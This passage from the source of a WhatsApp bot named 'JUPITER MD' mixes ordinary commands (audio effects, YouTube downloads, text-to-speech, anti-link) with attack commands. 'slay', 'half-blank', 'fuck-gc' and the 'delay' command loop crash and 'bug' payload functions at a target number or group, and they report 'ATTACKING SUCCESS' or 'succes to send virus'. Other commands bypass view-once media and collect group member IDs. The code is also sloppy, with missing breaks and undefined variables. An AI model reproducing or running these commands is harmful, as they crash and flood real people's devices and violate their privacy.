            conversation: "𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗"
        }
    };

    // Send the menu image with the caption
    await gz.sendMessage(from, {
        image: { url: mrrogueUrl },
        caption: menuText
    }, { quoted: fakeSystem });

    // Wait for 2 seconds before sending the audio message
    await sleep(2000)

await gz.sendMessage(m.chat, {

audio: jupiterplay,

mimetype: 'audio/mpeg'

}, { quoted: m

})


}
break;
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                let media = await gz.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return reply(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    gz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                reply(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            reply('Invalid command');
        }
    } catch (e) {
        reply(e);
    }
    break;
case 'ytmp3':
case 'ytaudio': {
  if (!text) return reply(` *Usage:* ${prefix}ytmp3 <YouTube URL>`);

  const ytUrl = encodeURIComponent(text.trim());
  const apiUrl = `https://fastrestapis.fasturl.cloud/downup/ytmp3?url=${ytUrl}&quality=128kbps&server=auto`;

  try {
    const res = await fetch(apiUrl);
    if (!res.ok) {
      console.error('API Error:', res.status);
      return reply('❌ Failed to fetch audio. Try again later.');
    }

    const { result } = await res.json();
    if (!result || !result.media) return reply('⚠️ No audio found.');

    const {
      title,
      media,
      quality,
      url,
      metadata,
      author
    } = result;

    const caption = `
┌──⭓${botname}
🎵 *Title:* ${title}
🎙️ *Author:* ${author.name}
🕒 *Duration:* ${metadata.duration}
📅 *Uploaded:* ${metadata.uploadDate}
👁️ *Views:* ${metadata.views}
🎧 *Quality:* ${quality}
🔗 *YouTube:* ${url}
└─────⭓
`;

    // Send thumbnail & info first
    await gz.sendMessage(m.chat, {
      image: { url: metadata.thumbnail },
      caption,
    }, { quoted: m });

    // Then send audio
    await gz.sendMessage(m.chat, {
      audio: { url: media },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: false
    }, { quoted: m });

  } catch (err) {
    console.error('YTMP3 ERROR:', err);
    reply('⚠️ Error occurred while processing audio.');
  }
  break;
}
case 'ytmp4':
case 'ytvideo': {
  if (!text) return reply(` *Usage:* ${prefix}ytmp4 <YouTube URL>`);

  const ytUrl = encodeURIComponent(text.trim());
  const apiUrl = `https://fastrestapis.fasturl.cloud/downup/ytmp4?url=${ytUrl}&quality=720&server=auto`;

  try {
    const res = await fetch(apiUrl);
    if (!res.ok) {
      console.error('API Error:', res.status);
      return reply('❌ Failed to fetch video. Try again later.');
    }

    const { result } = await res.json();
    if (!result || !result.media) return reply('No video found.');

    const {
      title,
      media,
      quality,
      url,
      metadata,
      author
    } = result;

    const caption = `
┌──⭓${botname}
🎬 *Title:* ${title}
🎙️ *Author:* ${author.name}
🕒 *Duration:* ${metadata.duration}
📅 *Uploaded:* ${metadata.uploadDate}
👁️ *Views:* ${metadata.views}
📥 *Quality:* ${quality}
🔗 *YouTube:* ${url}
└─────⭓
`;

    // Send preview first
    await gz.sendMessage(m.chat, {
      image: { url: metadata.thumbnail },
      caption,
    }, { quoted: m });

    // Send the actual video
    await gz.sendMessage(m.chat, {
      video: { url: media },
      mimetype: 'video/mp4',
      fileName: `${title}.mp4`,
      caption: `🎞️ ${title}`
    }, { quoted: m });

  } catch (err) {
    console.error('YTMP4 ERROR:', err);
    reply('⚠️ Error occurred while processing video.');
  }
  break;
}

case "autoreact": {                         
 if (!isCreator) return reply("```for My Owner only```.");
    // Parse command for 'on' or 'off'
    const args = text.trim().split(' ')[0];
    if (!args || !["on", "off"].includes(args)) {
        return reply(' use: *autoreact on* or *autoreact off*');
    }

    if (!global.autoReact) global.autoReact = {};

    // Set auto-react status based on command
    if (args === "on") {
        global.autoReact[m.chat] = true;
        return reply('```auto react command enabled successfully enjoy 𖤍```');
    } else if (args === "off") {
        global.autoReact[m.chat] = false;
        return reply('```auto react command disabled succesfully 𓃘```');
    }
}
break;
case 'slay': {
  try {
    //if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return reply(example("234xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return gz.sendMessage(`Example: ${command} 234xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
////////// Sending Bugs //////////
for (let r = 0; r < 50; r++) {
     await YukinaSex(target);
     await AudioInvis(target);
     await HeavenSqL(target);
      await InvisLoca(target);
     await InvisLoca(target);
     await InvisLoca(target);
     await ScarySqL(target);
      await VerloadFcVisibleV1(target);
      await sleep(1);
     } return reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    gz.sendMessage(`succes to send virus `);
}
}
case '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗-fuck': {
  try {
    //if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return reply(example("234xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return reply(`Example: ${command} 234xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
////////// Sending Bugs //////////
for (let r = 0; r < 50; r++) {
     await invico1(target);
     await NewBlank(target);
      await CallUi(target);
      await ScarySqL(target);
      await HeavenSqL(target);
      await InvisLoca(target);
     await InvisLoca(target);
     await InvisLoca(target);
     await ScarySqL(target);
      await sleep(20);
     }return reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    gz.sendMessage(`succes to send virus `);
}
}
case 'half-blank': {
  try {
    //if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return reply(example("234xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return reply(`Example: ${command} 234xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
////////// Sending Bugs //////////
for (let r = 0; r < 50; r++) {
     await InvisLoca(target);
     await InvisLoca(target);
     await InvisLoca(target);
     await ScarySqL(target);
      await sleep(1);
     }return reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    gz.sendMessage(`succes to send virus `);
}
}
case 'fuck-gc': {
   if (!q) return reply(`Invalid\nUsage: ${prefix + command} + link : https://chat.whatsapp.com/`)
   let result = args[0].split("https://chat.whatsapp.com/")[1];
   let target = await gz.groupAcceptInvite(result);
   for (let i = 0; i < 100; i++) {
       await BugGroup(jid, count);
   }
   reply(`Successfully Sent Bugs 
Bug Type: Gc crash Powered By 𝗝𝗨𝗣𝗜𝗧𝗘𝗥
`);
}
break
case '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗-delay': {
  try {
    //if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return reply(example("234xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return reply(`Example: ${command} 234xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
////////// Sending Bugs //////////
for (let r = 0; r < 50; r++) {
     await delaynew(target);
      await delaynew(target);
      await InvisLoca(target);
      await delaynew(target);
      await sleep(600000);
      await InvisLoca(target);
      await ScarySqL(target);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await sleep(7200000);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await sleep(7200000);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await sleep(7200000);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await delaynew(target);
      await delaynew(target);
      await delaynew(target);
      await sleep(600000);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await sleep(7200000);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await sleep(7200000);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await bulldozercltyCall(target);
      await sleep(7200000);
      await extrakuota(target);
      await extrakuota(target);
      await extrakuota(target);
      await extrakuota(target);
      await extrakuota(target);
      await extrakuota(target);
      await sleep(7200000);
     }return reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」")
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    gz.sendMessage(`succes to send virus `);
}
}
break; 

case 'video':
case 'ytsearch': {
  if (!text) return reply(`*Usage:* ${prefix}ytvideo <search keywords>`);

  try {
    // Search YouTube for videos
    const results = await richyts.GetListByKeyword(text, false, 1, [{ type: "video" }]);
    const video = results.items?.[0];
    if (!video) return reply("❌ No video found.");

    const ytUrl = `https://youtu.be/${video.id}`;
    const apiUrl = `https://fastrestapis.fasturl.cloud/downup/ytmp4?url=${encodeURIComponent(ytUrl)}&quality=720&server=auto`;

    // Fetch video download link from FastRest
    const fetchRes = await fetch(apiUrl);
    if (!fetchRes.ok) return reply("⚠️ Couldn't fetch video info.");
    const { result } = await fetchRes.json();

    const {
      title,
      media,
      quality,
      url,
      metadata,
      author
    } = result;

    const caption = `
🎬 *Title:* ${title}
🎙️ *Author:* ${author.name}
🕒 *Duration:* ${metadata.duration}
📅 *Uploaded:* ${metadata.uploadDate}
👁️ *Views:* ${metadata.views}
📥 *Quality:* ${quality}
🔗 *YouTube:* ${url}
`;

    // Send thumbnail first
    await gz.sendMessage(m.chat, {
      image: { url: metadata.thumbnail },
      caption,
    }, { quoted: m });

    // Then send the actual video
    await gz.sendMessage(m.chat, {
      video: { url: media },
      mimetype: 'video/mp4',
      fileName: `${title}.mp4`,
      caption: `🎞️ ${title}`
    }, { quoted: m });

  } catch (e) {
    console.error('YTSEARCH ERROR:', e);
    reply("❌ Error searching and downloading video.");
  }
  break;
}
case 'say': case 'tts': case 'gtts':{

if (!qtext) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return gz.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break;
     case "play2":{
                if (!text) return reply(`\n*ex:* ${prefix + command} fucklove\n`)
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                gz.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: m })
            }
            break;
        case 'apk':
case 'apkdl': {
  if (!text) return reply(` *Example:* ${prefix + command} whatsapp`);
  try {
    const res = await fetch(`https://apis.davidcyriltech.my.id/download/apk?text=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (!data.success) return reply(' *APK not found.* Try another name.');

    await gz.sendMessage(m.chat, {
      image: { url: data.thumbnail },
      caption:
`╭〔 *📦 APK Downloader* 〕─⬣
│
│ 🧩 *Name:* _${data.apk_name}_
│ 📥 *Download:* [Click Here](${data.download_link})
│ 📁 *Size:* _${data.size || 'Unknown'}_
│
╰────────────⬣
_𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 Sending file, please wait..._`
    }, { quoted: m });

    await gz.sendMessage(m.chat, {
      document: { url: data.download_link },
      fileName: `${data.apk_name}.apk`,
      mimetype: 'application/vnd.android.package-archive'
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply('*Failed to fetch APK.* Try again later.');
  }
}
break;
// Command handler
case 'antilink':
case 'antilink on':
case 'antilink off': {
    if (!m.isGroup) return reply('*Error:* This command only works in groups brr!');
    if (!isBotAdmins) return reply('*Error:* I must be made an admin to control anti-link!');
    if (!isAdmins) return reply('*Error:* Only admins can control anti-link𓃱!');

    const text = m.text.toLowerCase();
    let action = 'status';
    
    if (text.includes('on')) action = 'on';
    else if (text.includes('off')) action = 'off';

    switch (action) {
        case 'on':
            antilinkStatus[from] = true;
            await reply('☠️ 𝗔𝗡𝗧𝗜-𝗟𝗜𝗡𝗞 𝗔𝗖𝗧𝗜𝗩𝗘 ☠️*  \n🔗 *Any link detected will be hunted down and obliterated.*  💀 *No warnings. No mercy. Only deletion.*  ⚔️ *The 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 enforces the rules.*.');
            break;
            
        case 'off':
            antilinkStatus[from] = false;
            await reply('*Anti-link disabled!* ❌\nLinks will not be deleted ☹️🙄.');
            break;
            
        default:
            const status = antilinkStatus[from] ? 'ENABLED ✅' : 'DISABLED ❌';
            await reply(`*Anti-link status:* ${status}`);
    }
    break;
}
case 'autobio':
if (!isCreator) return reply('  😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
       if (!isCreator) return reply("`For My Owner only```.");
                if (args.length < 1) return replyg(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break;
                case "test":
        {
          reply("```𝗝𝗨𝗣𝗜𝗧𝗘𝗥 ALWAYS THERE FOR YOU 🫵🔥🥶``");
        }
        break;
        case 'panel': {
if (!isCreator) return reply('  😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
  reply(`
\`\`\`BUY A PANEL FROM Godszeal\`\`\`
\`\`\`\`THAT CAN LAST YOU UP TO 1MONTH\`\`\`
╚┈┈┈┈┈┈┈┈┈┈┈
DM if interested 
https://t.me/AiOfLautech
Or +2349074488015
☝️☝️☝️Dm now`)
  }
  break;
case 'aza':
  case 'pay':
  case 'accnum':
  case 'account': {
  reply(`\`BANK DETAILS\`
  🤐 _*${global.bankowner}*_
  
  🔢 ${global.banknumber}
  
  🏦 _*${global.bankname}*_
  *SEND SCREENSHOT AFTER PAYMENT*`)
  }
  break;
  case 'getpp':{
if (!isCreator) return reply('😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await gz.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
gz.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;
// waifu cases
case "nwaifu": {

    const apiUrl = `https://reaperxxxx-anime.hf.space/api/waifu?category=waifu&sfw=true`;
    const response = await axios.get(apiUrl);
    const data = await response.data;
    const imageUrl = data.image_url
    
    await gz.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "```Your Nwaifu  𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 🤨😄```"
      }, { quoted: m }); // Add quoted option for context
      }
      break
    case "rwaifu": {
    
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await gz.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "```Your Random Waifu by 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 😙😃```"
      }, { quoted: m }); // Add quoted option for context
      }
      break;
      case 'waifu' :

waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
gz.sendMessage(from, {image: {url:waifudd.data.url},caption:`Your waifu by ${botname} XD`}, { quoted:m }).catch(err => {
 return('Error!')
})
break;      
case 'groupjid':{
          if (!isCreator) return reply('😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
        const groupMetadata = m.isGroup ? await gz.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      reply(textt)
    }
    break;
    case 'animesearch': {
if (!isCreator) return reply('  😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
if (!text) return reply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await gz.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break;
case 'vv': {
if (!isCreator) return reply("``` 😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!```");
    if (!m.quoted) return reply('oops seems brr forgot to reply to a view-once image, video, or voice note!');

    try {
        const mediaBuffer = await gz.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('Whoops~ That slipped through the 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗.... Would you Mind dropping it again?\n~ *Forever lurking,* *𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗* 🕳️💀');  
        }  

        const mediaType = m.quoted.mtype;  
        const footer = "\n─────⸙*𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗*";

        if (mediaType === 'imageMessage') {  
            await gz.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "*Image unsealed successfully~*" + footer  
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await gz.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "*Video unsealed for Master~*" + footer  
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await gz.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg',  
                ptt: true,  
                caption: "*Here's the secret voice~*" + footer  
            }, { quoted: m });
        } else {  
            return reply('Omon🤦 I can only reveal images, videos, or voice notes, Master!\n~ Always at your Service ® 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 .');  
        }
    } catch (error) {
        console.error('Error:', error);
        await reply('⚠️ Oops... the 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 glitched.Something slipped into the abyss —  Try again or use `.save` to lock it down.\n~ A whisper from ᖫ 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 🕳️  Your darkness, your command!');
    }
}
break;
case 'speedtest': case 'speed': {
if (!isCreator) return reply(' 😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');;
let timestamp = speed()
let latensi = speed() - timestamp
         reply (`━━━━━━━━━━━━━━━━━\n\◉ XUP BRR ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈ 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 SPEED 🚤⚡⚡🔦 : ${latensi.toFixed(4)} MS\n\━━━━━━━━━━━━━━━━━`); 
}
break
case 'clearbugs': {
if (!isCreator) return reply(`Sorry, for my owner only`)
if (!q) return reply(`Example:\n ${prefix + command} 234xxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
gz.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n